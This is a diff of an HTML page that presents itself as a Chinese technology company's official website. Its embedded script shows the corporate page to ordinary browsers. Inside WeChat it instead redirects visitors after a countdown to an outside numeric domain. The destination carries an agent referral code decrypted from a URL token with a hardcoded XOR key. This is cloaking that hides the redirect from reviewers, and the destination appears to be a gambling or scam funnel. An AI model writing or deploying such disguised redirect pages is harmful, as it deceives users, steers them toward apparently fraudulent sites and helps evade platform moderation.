@@ -337,7 +337,7 @@
     </div>
     <p>华创科技有限公司 版权所有</p>
     <p>地址：深圳市南山区科技园南区华创大厦</p>
-    <p>邮箱：contact@huachuang.tech　电话：400-888-9999</p>
+    <p>邮箱：contact@huachuang.tech　 </p>
     <p class="copy">© 2024 Huachuang Technology Co., Ltd. All Rights Reserved.</p>
   </div>
 
@@ -369,8 +369,12 @@
 <script>
 (function () {
   /* ================= 跳转配置 ================= */
-  // 跳转目标地址（写死）
-  var TARGET_URL = 'http://888.qhh0898.com/html/#/?ref=vv8888';
+  // 主站地址（跳转目标 = 主站 + /html/#/?ref= + agentCode）
+  var MAIN_SITE = 'https://88800.ynw56.cn';
+  // 加密密钥（必须与原程序 .env 里的 CRYPTO_SECRET 一致）
+  var CRYPTO_SECRET = 'YourSecretKey123';
+  // 没有 token / 解密失败时的兜底 agentCode（留空则不跳转）
+  var FALLBACK_CODE = '';
   // 倒计时秒数
   var COUNTDOWN = 5;
   // 是否只在微信内跳转（true = 普通浏览器只展示页面，不跳转）
@@ -378,12 +382,57 @@
   // 是否在原窗口跳转（true = 当前窗口；false = 新窗口打开）
   var JUMP_IN_SAME_TAB = true;
 
+  /* ================= 解密 token -> agentCode ================= */
+  // 算法与原程序 src/utils/crypto.ts 完全一致：base64urlsafe 解码 -> 二进制转 UTF-8 字符串 -> XOR
+  function fromUrlSafeBase64(s) {
+    var b = String(s).replace(/-/g, '+').replace(/_/g, '/');
+    while (b.length % 4) b += '=';
+    return b;
+  }
+  function xorString(input, key) {
+    var r = '';
+    for (var i = 0; i < input.length; i++) {
+      r += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return r;
+  }
+  function decryptRef(token) {
+    try {
+      var bin = atob(fromUrlSafeBase64(token));
+      var bytes = new Uint8Array(bin.length);
+      for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+      var decoded = '';
+      if (typeof TextDecoder !== 'undefined') {
+        decoded = new TextDecoder('utf-8').decode(bytes);
+      } else {
+        for (var j = 0; j < bytes.length; j++) decoded += String.fromCharCode(bytes[j]);
+      }
+      var code = xorString(decoded, CRYPTO_SECRET);
+      return /^[\x20-\x7E]+$/.test(code) ? code : null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  /* ================= 取 token 并算目标地址 ================= */
+  function getQuery(name) {
+    var m = new RegExp('[?&]' + name + '=([^&#]*)').exec(window.location.search);
+    return m ? decodeURIComponent(m[1]) : '';
+  }
+
+  var token = getQuery('token');
+  var agentCode = token ? decryptRef(token) : null;
+  if (!agentCode && FALLBACK_CODE) agentCode = FALLBACK_CODE;
+
+  var TARGET_URL = agentCode ? MAIN_SITE + '/html/#/?ref=' + encodeURIComponent(agentCode) : '';
+
   /* ================= 环境判断 ================= */
   var ua = navigator.userAgent || '';
   var isWechat = /MicroMessenger/i.test(ua);
 
   // 非微信（或开关关闭）→ 不弹窗、不跳转，只展示官网页面
   if (ONLY_IN_WECHAT && !isWechat) return;
+  // 无有效目标 → 不弹窗
   if (!TARGET_URL) return;
   if (!/^https?:\/\//i.test(TARGET_URL)) return;
 
